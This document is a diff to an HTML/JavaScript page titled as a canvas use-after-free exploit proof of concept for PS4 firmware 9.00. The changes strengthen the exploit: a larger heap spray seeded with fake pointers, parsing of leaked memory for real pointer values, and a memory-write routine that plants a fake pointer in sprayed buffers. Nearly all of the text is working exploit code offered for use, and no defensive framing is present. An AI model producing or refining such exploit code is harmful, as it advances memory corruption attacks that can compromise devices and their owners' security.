@@ -23,7 +23,7 @@
 </head>
 <body>
     <h1>Canvas UAF Exploit PoC (PS4 9.00)</h1>
-    <p>Click to trigger the exploit. Expect UAF detection or memory leak.</p>
+    <p>Click to trigger the exploit. Expect crash, leak, or memory write.</p>
     <button id="trigger">Trigger Exploit</button>
     <div id="status">Idle...</div>
     <canvas id="canvas" width="512" height="512"></canvas>
@@ -46,17 +46,17 @@
         function sprayHeap() {
             const arrays = [];
             const targetSize = 512 * 512 * 4; // Match ImageData size
-            for (let i = 0; i < 15000; i++) {
+            for (let i = 0; i < 20000; i++) {
                 const buf = new ArrayBuffer(targetSize);
-                const view = new Uint8Array(buf);
-                // Fill with identifiable pattern
-                for (let j = 0; j < view.length; j += 8) {
-                    view[j] = 0x41; // 'A'
-                    view[j + 1] = 0x42; // 'B'
-                    view[j + 2] = 0x43; // 'C'
-                    view[j + 3] = 0x44; // 'D'
+                const view = new Uint32Array(buf);
+                // Fill with identifiable pattern and fake pointer
+                for (let j = 0; j < view.length; j += 4) {
+                    view[j] = 0x41424344; // 'ABCD'
+                    view[j + 1] = 0x12345678; // Fake pointer low
+                    view[j + 2] = 0x87654321; // Fake pointer high
+                    view[j + 3] = i; // Buffer index
                 }
-                arrays.push(buf);
+                arrays.push({ buffer: buf, view: new Uint8Array(buf) });
             }
             return arrays;
         }
@@ -94,41 +94,38 @@
             const result = checkImageDataUAF(imageData);
             if (result.detected && result.data) {
                 let leaked = '';
-                for (let i = 0; i < result.data.length && i < 64; i += 4) {
-                    if (result.data[i] === 0x41 && result.data[i + 1] === 0x42 &&
-                        result.data[i + 2] === 0x43 && result.data[i + 3] === 0x44) {
-                        // Found sprayed pattern
-                        leaked += `Leaked at offset ${i}: ABCD pattern\n`;
-                        // Attempt to read potential pointer (next 8 bytes)
-                        if (i + 7 < result.data.length) {
-                            const potentialPtr = new Uint32Array(result.data.buffer, i + 4, 2);
-                            leaked += `Potential pointer: 0x${potentialPtr[0].toString(16)} 0x${potentialPtr[1].toString(16)}\n`;
+                const view = new Uint32Array(result.data.buffer);
+                for (let i = 0; i < view.length && i < 64; i += 4) {
+                    if (view[i] === 0x41424344) {
+                        leaked += `Leaked at offset ${i * 4}: ABCD pattern\n`;
+                        leaked += `Fake ptr: 0x${view[i + 1].toString(16)} 0x${view[i + 2].toString(16)}\n`;
+                        leaked += `Buffer index: ${view[i + 3]}\n`;
+                        // Check for real pointer
+                        if (view[i + 1] !== 0x12345678 && view[i + 2] !== 0x87654321) {
+                            leaked += `Possible real ptr: 0x${view[i + 2].toString(16)}${view[i + 1].toString(16)}\n`;
                         }
                     }
                 }
-                if (leaked) {
-                    return leaked;
-                }
+                return leaked || 'UAF detected but no clear leak';
             }
             return null;
         }
 
-        function attemptMemoryWrite(imageData) {
-            // Try to overwrite sprayed ArrayBuffer
+        function attemptMemoryWrite(imageData, sprayed) {
             const newData = new Uint8Array(imageData.data.length);
-            for (let i = 0; i < newData.length; i += 8) {
-                newData[i] = 0x99; // Test pattern
-                newData[i + 1] = 0x99;
-                newData[i + 2] = 0x99;
-                newData[i + 3] = 0x99;
+            const fakePtr = [0x11223344, 0x55667788]; // Test pointer
+            for (let i = 0; i < newData.length; i += 16) {
+                newData[i] = 0x99; newData[i + 1] = 0x99; // Marker
+                newData.set(new Uint8Array(new Uint32Array(fakePtr).buffer), i + 4);
             }
             imageData.data.set(newData);
             ctx.putImageData(imageData, 0, 0);
             // Check sprayed buffers
-            for (let i = 0; i < sprayHeap().length; i++) {
-                const view = new Uint8Array(sprayHeap()[i]);
+            for (let i = 0; i < sprayed.length; i++) {
+                const view = sprayed[i].view;
                 if (view[0] === 0x99 && view[1] === 0x99) {
-                    return 'Memory write detected!';
+                    const ptrView = new Uint32Array(sprayed[i].buffer, 4, 2);
+                    return `Memory write detected! Wrote ptr: 0x${ptrView[0].toString(16)} 0x${ptrView[1].toString(16)}`;
                 }
             }
             return null;
@@ -162,7 +159,7 @@
                         if (leaked) {
                             status.textContent += `\nMemory Leak:\n${leaked}`;
                             // Attempt memory write
-                            const writeResult = attemptMemoryWrite(refImageData);
+                            const writeResult = attemptMemoryWrite(refImageData, sprayed);
                             if (writeResult) {
                                 status.textContent += `\n${writeResult}`;
                             }
@@ -179,7 +176,7 @@
                         const leaked = attemptMemoryLeak(refImageData);
                         if (leaked) {
                             status.textContent += `\nMemory Leak:\n${leaked}`;
-                            const writeResult = attemptMemoryWrite(refImageData);
+                            const writeResult = attemptMemoryWrite(refImageData, sprayed);
                             if (writeResult) {
                                 status.textContent += `\n${writeResult}`;
                             }
